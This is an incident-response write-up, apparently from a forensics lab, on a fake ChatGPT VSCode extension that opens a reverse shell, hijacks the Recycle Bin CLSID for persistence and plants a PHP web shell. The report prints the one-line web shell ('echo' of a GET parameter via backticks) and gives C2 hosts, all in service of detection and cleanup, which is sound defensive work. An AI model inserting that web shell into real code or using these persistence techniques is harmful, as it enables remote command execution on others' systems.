# ReliableThreat Incident Response Analysis

## Executive Summary

This investigation analysed a sophisticated supply chain attack targeting a developer environment through a malicious Visual Studio Code extension. The threat actor gained initial access via a fake AI productivity tool, established multiple persistence mechanisms, and maintained command and control through encrypted tunnelling services.

**Key Findings:**

- **Attack Vector:** Malicious VSCode extension mimicking ChatGPT functionality
- **Threat Actor:** 0xS1rx58.D3V
- **Impact:** Full system compromise with multiple persistence mechanisms
- **Techniques:** Supply chain attack, code obfuscation, CLSID hijacking, source code modification to allow web shell deployment

---

## Investigation Methodology

### Tools Used

- **Volatility 3** - Memory forensics and analysis
- **FTK Imager** - Disk image examination
- **Static Analysis** - JavaScript deobfuscation and code review
- **Registry Analysis** - Persistence mechanism identification

### Evidence Analysed

- `memdump.dmp` - Windows 10 memory dump
- `Users.ad1` - Disk image containing user profiles and artefacts

---

## Technical Analysis

### 1. Initial Access Vector

**Malicious VSCode Extension Discovery:**

```bash
python vol.py -f memdump.dmp windows.filescan | grep -i "vscode"
```

**Key Finding:** Suspicious extension located at:

```
C:\Users\User2\.vscode\extensions\0xs1rx58d3v.chatgpt-b0t-0.0.1\extension.js
```

**Indicators of Compromise:**

- Publisher handle using leetspeak: `0xS1rx58D3V`
- Suspicious extension name: `ChatGPT-B0T` (typosquatting)
- Version 0.0.1 indicating new/untested release
- Installation from official VS Code marketplace (supply chain compromise)

### 2. Malware Analysis

**Obfuscated JavaScript Payload:** The extension contained heavily obfuscated JavaScript that activated when users typed "help":

```javascript
// Trigger mechanism (deobfuscated excerpt)
else if (userInput.toLowerCase().includes('help')) {
    response = 'You can ask me about programming languages...';
    // Malicious payload execution hidden here
}
```

**Deobfuscation Process:**

1. Beautified obfuscated code for readability
2. Identified string array containing malicious strings
3. Manually calculated hexadecimal offsets
4. Extracted C2 infrastructure details

**Command & Control Infrastructure:**

- **Server:** 6.tcp.eu.ngrok.io
- **Port:** 16587 (calculated from obfuscated hex: `0x1fd*-0xb+-0x11d5+0x687f`)
- **Protocol:** TCP reverse shell via Node.js net module

### 3. Process Analysis

**Attack Chain Identification:**

```bash
python vol.py -f memdump.dmp windows.pstree
```

**Process Hierarchy:** Looking at my process analysis, I found multiple Code.exe processes running (PIDs: 1fac, 10b0, 1dd4, 1e78, 1ebc, etc.), which made it challenging to identify which one was compromised.

**Malicious Executable Location:** Later in the investigation, I found evidence of: `C:\Users\Public\temp.exe`

**Analysis:** This file was masquerading as RuntimeBroker.exe but was actually stored as temp.exe in an unusual location.

### 4.Network Connection Analysis

To understand the full scope of the attack, I examined active network connections:

```bash
python vol.py -f memdump.dmp windows.netstat
```

![runtimebroker TCP connection](images/ReliableThreat-netstat.png)

This revealed that RuntimeBroker.exe had an active connection to `18.197.239.5:18854` at the time of memory capture. This represents a **second C2 channel** beyond the ngrok tunnel found in the VSCode extension, indicating a sophisticated multi-stage attack:

- **Stage 1:** VSCode extension connects to `6.tcp.eu.ngrok.io:16587`
- **Stage 2:** Downloaded RuntimeBroker.exe connects to `18.197.239.5:18854`

After running this IP through an IP abuse database, I found that this is associated with the NJ RAT malware.

![abuseIPdb screenshot](images/ReliableThreat-ipabusedb.png)

https://www.abuseipdb.com/check/18.197.239.5

### 5. Persistence Mechanisms

#### Mechanism 1: CLSID Hijacking

**Registry Modification Target:**

```
HKEY_LOCAL_MACHINE\SOFTWARE\Classes\CLSID\{645FF040-5081-101B-9F08-00AA002F954E}\shell\open\command
```

**Compromised Component:** Windows Recycle Bin

- **MITRE Technique:** T1546.015 (Event Triggered Execution: Component Object Model Hijacking)
- **Impact:** Malicious code executes whenever user interacts with Recycle Bin
- **Stealth Factor:** High frequency, low suspicion trigger

#### Mechanism 2: Web Application Backdoor

**Laravel Application Compromise:**

```php
// Malicious code injected into /Users/User2/Project/laravel-11.1.4/public/index.php
$testc = $_GET['s1']; echo `$testc`;
```

**Analysis:**

- Web shell allowing remote command execution
- Parameter: `s1` via GET request
- Provides secondary access method if primary persistence fails

### 6. Timeline Analysis

**Key Timestamps:**

- **Extension Published:** 2024-07-23 01:41:19 UTC (from VS Code Marketplace)
- **Extension Installed:** 1721663762299 (Unix timestamp in milliseconds)
- **System Compromise:** 2024-07-23 02:33:49 (from memory dump)

### 7. Attribution

**Threat Actor Profile:**

- **Handle:** 0xS1rx58.D3V
- **Publisher Display Name:** 0xS1rx58.D3V
- **Tactics:** Supply chain attacks targeting developers
- **Sophistication Level:** High (multiple persistence, obfuscation, legitimate distribution)

---

## Impact Assessment

### Compromised Assets

- User2 development environment
- Source code repositories (Laravel projects)
- System-level persistence across reboots
- Web application integrity

### Attack Sophistication

- **Supply Chain:** Leveraged trusted software distribution
- **Social Engineering:** Mimicked popular AI development tools
- **Multi-Stage Persistence:** Registry hijacking + web shells
- **Evasion Techniques:** Heavy code obfuscation, legitimate tool abuse

---

## Investigation Process

### Initial Discovery

My investigation started by examining the process tree to understand what kicked off the suspicious activity. I noticed that **code.exe** was running, but what made this tricky was that all the malicious execution was happening **within the code.exe process itself** - there weren't obvious suspicious child processes spawning that would normally catch your attention.

```bash
python vol.py -f memdump.dmp windows.pstree
```

This made the attack much harder to detect initially since VSCode appeared to be running normally without spawning obviously suspicious subprocesses. The malicious activity was hidden within the legitimate VSCode process.

### Early Theory: Memory Corruption or Workspace Exploitation

Initially, I suspected this might be a **malicious VSCode workspace file** (.code-workspace) that exploited a vulnerability in VSCode's file handling. The presence of obfuscated JavaScript in memory and what appeared to be corrupted return addresses suggested possible memory corruption or code injection.

However, further analysis revealed the actual attack vector was a **malicious extension** distributed through the legitimate VSCode marketplace rather than a workspace file exploitation.

### Volatility Encoding Issues

Right off the bat, I hit encoding problems with Volatility that stopped any memory analysis from happening:

```
UnicodeEncodeError: 'charmap' codec can't encode characters
```

I couldn't pipe output or redirect to files - everything would crash. After some trial and error, I found the fix:

```bash
python -X utf8 vol.py -f memdump.dmp windows.filescan
```

This UTF-8 encoding flag solved the Unicode issues and let me proceed with the analysis.

### Discovering the Hidden Execution Path

Since the malicious activity was contained within the code.exe process rather than spawning obvious child processes, I had to dig deeper into what VSCode was actually loading and executing. Looking at my process analysis, I found multiple Code.exe processes running (PIDs: 1fac, 10b0, 1dd4, 1e78, 1ebc, etc.), which made it challenging to identify which one was compromised.

![Process Tree](images/ReliableThreat-pstree-for-codeexe.png)

_Process tree showing multiple Code.exe processes with extension infrastructure active. Note the absence of obvious malicious child processes - the attack was hidden within VSCode's legitimate process space, making detection much more challenging._

This led me to examine the VSCode extensions and files loaded in memory, which is where I found the real smoking gun.

### Discovering the Malicious Extension

After resolving the encoding issues, I ran a comprehensive file scan looking for VSCode-related files:

```Powershell
python -X utf8 vol.py -f memdump.dmp windows.filescan | Select-String "vscode" > vscode_files.txt
```

Then I searched through all the extensions. Looking through the massive list of legitimate extensions (like devsense.phptools, ritwickdey.liveserver, ms-python.vscode-pylance), one immediately stood out as suspicious:

```
0x850cd16d92b0	\Users\User2\.vscode\extensions\0xs1rx58d3v.chatgpt-b0t-0.0.1\package.json
0x850cd2e704f0	\Users\User2\.vscode\extensions\0xs1rx58d3v.chatgpt-b0t-0.0.1\extension.js
```


**Red flags that made this suspicious:**

- **Publisher handle:** `0xs1rx58d3v` (clearly a hacker handle)
- **Extension name:** `chatgpt-b0t` (trying to mimic ChatGPT but with suspicious spelling)
- **Version:** `0.0.1` (brand new, completely untested)
- **Stood out:** Among all the legitimate, professional extensions, this one looked completely out of place

![VSCode Extension Discovery](images/ReliableThreat-pstree-for-codeexe.png)

_Screenshot showing the suspicious ChatGPT extension discovered among legitimate VSCode extensions in memory - the clear anomaly that led to the breakthrough._

This was clearly the **patient zero** of the attack - a **social engineering attack** using a fake AI productivity extension to compromise developer tools.

### Extracting and Analysing the Malicious Code

I found the virtual memory address for the extension.js file:

```
\Users\User2\.vscode\extensions\0xs1rx58d3v.chatgpt-b0t-0.0.1\extension.js
Virtual Address: 0x850cd2e704f0
```

Then extracted it from memory:

```bash
python vol.py -f memdump.dmp windows.dumpfiles --virtaddr 0x850cd2e704f0
```

When I opened the extracted .dat file in Notepad++, I could see the JavaScript code and immediately recognised the malicious functionality.

### The "Help" Trigger Discovery

When I examined the extracted file, I found a clever trick from the malware author. The malicious code was triggered when users typed **"help"** - which is brilliant social engineering since that's literally the first thing anyone would try with a new chatbot.

```javascript
else if (userInput.toLowerCase().includes('help')) {
    response = 'You can ask me about programming languages...';
    // Hidden malicious payload executes here
}
```

### Deobfuscating the C2 Infrastructure

The JavaScript was heavily obfuscated with hex calculations. I could make out readable strings like:

- `6.tcp.eu.ngrok.io`
- Various network-related terms

To find the port number, I:

1. **Beautified the JavaScript** to make it more readable
2. Found a line with `new net[(constant)]`
3. Used **Windows Programmer Calculator** to solve the hex equation
4. **Result: Port 16587**

![Obfuscated Code](images/ReliableThreat-Obfuscated-code.png)

_Obfuscated JavaScript code showing the network connection setup - demonstrating the deobfuscation challenge faced during analysis._

**Complete C2 Server:** `6.tcp.eu.ngrok.io:16587`

### Attribution Analysis

I dumped the package.json file from memory to get attribution data:

```bash
python vol.py -f memdump.dmp windows.dumpfiles --virtaddr [package.json address]
```

**Key finding:** The `publisher` and `publisherDisplayName` were slightly different, suggesting the threat actor might be trying to impersonate a legitimate developer.

![Package.json Attribution](images/ReliableThreat-threat-actor-pub-display.png)

_Package.json metadata showing threat actor attribution data - publisher details that helped identify the malicious actor behind the supply chain attack._

![Package.json Attribution](images/ReliableThreat-threat-actor-metadata.png)

### Timeline Analysis

The installation timestamp was in Unix format and needed conversion:

```powershell
[DateTimeOffset]::FromUnixTimeMilliseconds(1721663762299)
```

For the actual publication date, I had to Google the publisher name in the Visual Studio Marketplace.

### User Identification

To find the compromised user's SID:

```bash
python vol.py -f memdump.dmp windows.getsids | Select-String "User2"
```

**Result:** `S-1-5-21-1998887770-13753423-1649717590-1001`

### Suspicious File Discovery

During my filescan analysis, I noticed something unusual - I found references to `RuntimeBroker.exe` but it wasn't located in System32 where it should be. Instead, the path showed `C:\Users\Public\RuntimeBroker.exe`, which was immediately suspicious since legitimate system processes should be in the System32 directory.

When I tried to find `C:\Users\Public\RuntimeBroker.exe` on the disk image, there was only `temp.exe` in this directory. I decided to extract this file and upload it to VirusTotal for analysis.

The VirusTotal analysis showed that this malware alters the registry key of the COM component with CLSID {645FF040-5081-101B-9F08-00AA002F954E} to download and execute files via PowerShell every time this component runs.

### Registry Persistence Analysis

Through the VirusTotal analysis of `temp.exe`, I discovered the registry modification technique. The malware modifies the registry key of the COM component with CLSID {645FF040-5081-101B-9F08-00AA002F954E}.

![VirusTotal Analysis](images/ReliableThreat-tempexe-virustotal.png)

_VirusTotal analysis results showing temp.exe as malware and revealing the registry modification technique used for persistence._

**The breakthrough:** Searching this CLSID led me to discover it was the **Recycle Bin identifier**.

```
CLSID: {645FF040-5081-101B-9F08-00AA002F954E}
```

**This was CLSID hijacking** - an extremely sophisticated persistence technique. Every time a user interacts with the Recycle Bin (which happens constantly), it triggers the malicious process to download and execute files via PowerShell.

**MITRE Technique:** T1546.015 (Event Triggered Execution: Component Object Model Hijacking)

### Web Shell Discovery

The threat actor also modified a project file for additional persistence. In the Laravel application's /Users/User2/Project/laravel-11.1.4/public/index.php:

```php
$testc = $_GET['s1']; echo `$testc`;
```

![index.php File changed for additional persistence](images/ReliableThreat-webshell-indexphp.png)

This creates a web shell allowing remote command execution via the `s1` parameter.

---

## Technical Analysis Summary

### Attack Chain

1. **Social Engineering:** User installs fake ChatGPT extension
2. **Trigger:** User types "help" to try the extension
3. **Payload:** Obfuscated JavaScript establishes reverse shell
4. **Persistence 1:** CLSID hijacking targets Recycle Bin
5. **Persistence 2:** Source code modification to allow a Web shell injection in Laravel app

### Sophistication Level: High

**What made this attack sophisticated:**

- **Supply chain compromise** through legitimate marketplace
- **Heavy obfuscation** to evade detection
- **Multiple persistence mechanisms** for redundancy
- **CLSID hijacking** requires deep Windows internals knowledge
- **Strategic target selection** (Recycle Bin = high interaction frequency)

### Key Indicators of Compromise (IOCs)

**Network:**

- 6.tcp.eu.ngrok.io:16587 (VSCode extension C2)
- 18.197.239.5:18854 (RuntimeBroker.exe C2)

**Files:**

- C:\Users\User2.vscode\extensions\0xs1rx58d3v.chatgpt-b0t-0.0.1\extension.js
- C:\Users\Public\temp.exe

**Registry:**

- HKLM\SOFTWARE\Classes\CLSID{645FF040-5081-101B-9F08-00AA002F954E}

---

## Incident Response Actions

### Immediate Containment

1. **Network Isolation:** Block C2 infrastructure:
    - 6.tcp.eu.ngrok.io:16587
    - 18.197.239.5:18854
2. **Process Termination:** Kill malicious RuntimeBroker.exe processes
3. **Extension Removal:** Uninstall 0xs1rx58d3v.chatgpt-b0t extension

### Eradication

1. **Registry Cleanup:** Restore CLSID {645FF040-5081-101B-9F08-00AA002F954E} to original state
2. **File Removal:** Delete malicious files:
    - C:\Users\Public\temp.exe
    - Complete extension directory: C:\Users\User2.vscode\extensions\0xs1rx58d3v.chatgpt-b0t-0.0.1\
3. **Web Shell Removal:** Clean Laravel application at /Users/User2/Project/laravel-11.1.4/public/index.php, remove malicious code:
    
    ```php
    $testc = $_GET['s1']; echo `$testc`;
    ```
    
1. **Source Code Review:** Audit all projects for additional modifications
2. **System Scanning:** Full antivirus scan to ensure no additional malware present
3. **VSCode Reset:** Clear VSCode workspace cache and extension history

### Recovery

1. **System Restoration:** Rebuild compromised development environment
2. **Code Integrity:** Restore clean versions from version control
3. **Monitoring Implementation:** Deploy EDR for extension installations

---

## Lessons Learnt

### Investigation Challenges

1. **Encoding issues** with Volatility and python required UTF-8 workarounds
2. **Heavy obfuscation** made malware analysis time-consuming
3. **Multiple persistence layers** required thorough disk and memory analysis as their could always be additional persistence mechanisms created by the threat actor

### Security Gaps Identified

1. **Lack of Extension Vetting:** No validation of VS Code extensions before installation
2. **Insufficient Monitoring:** No detection of suspicious process chains

### Recommendations

1. **Developer Security Training:** Education on supply chain risks
2. **Extension Allow list:** Centralised control of approved extensions that have been vetted
3. **Behavioural Monitoring:** Detection of unusual process relationships
4. **Code Integrity Monitoring:** Real-time detection of source code modifications
5. **Network Segmentation:** Isolate development environments

---

## Technical Appendix

### Volatility Commands Used

```bash
# System information
python vol.py -f memdump.dmp windows.info

# Process analysis
python vol.py -f memdump.dmp windows.pstree
python vol.py -f memdump.dmp windows.cmdline

# File system analysis
python vol.py -f memdump.dmp windows.filescan

# Network analysis
python vol.py -f memdump.dmp windows.netstat

# File extraction
python vol.py -f memdump.dmp windows.dumpfiles --virtaddr [address]

# User identification
python vol.py -f memdump.dmp windows.getsid --pid [pid]
```

### Indicators of Compromise (IOCs)

#### Network IOCs

- 6.tcp.eu.ngrok.io:16587 (VSCode extension C2 server)
- 18.197.239.5:18854 (RuntimeBroker.exe C2 server)

#### File IOCs

- C:\Users\User2.vscode\extensions\0xs1rx58d3v.chatgpt-b0t-0.0.1\extension.js
- C:\Users\Public\temp.exe

#### Registry IOCs

- HKLM\SOFTWARE\Classes\CLSID{645FF040-5081-101B-9F08-00AA002F954E}\shell\open\command

#### Process IOCs

- RuntimeBroker.exe running from Users\Public
- Unusual cmd.exe child processes under Code.exe

### MITRE ATT&CK Mapping

- **T1195.002** - Supply Chain Compromise: Compromise Software Supply Chain
- **T1059.007** - Command and Scripting Interpreter: JavaScript
- **T1546.015** - Event Triggered Execution: Component Object Model Hijacking
- **T1071.001** - Application Layer Protocol: Web Protocols
- **T1505.003** - Server Software Component: Web Shell

---

## Conclusion

This investigation revealed a sophisticated multi-stage attack that successfully compromised a developer environment through social engineering and established persistent access via advanced Windows internals techniques. The threat actor demonstrated significant technical capability in JavaScript obfuscation, Windows registry manipulation, and understanding of developer workflows.

The attack's success highlights the critical importance of securing development environments and the effectiveness of supply chain attacks targeting trusted development tools. The CLSID hijacking technique, in particular, shows this was likely an advanced persistent threat with deep Windows knowledge rather than opportunistic malware.

The comprehensive forensic analysis successfully identified all attack vectors, mapped the complete attack chain, and provided actionable intelligence for both immediate response and long-term security improvements.
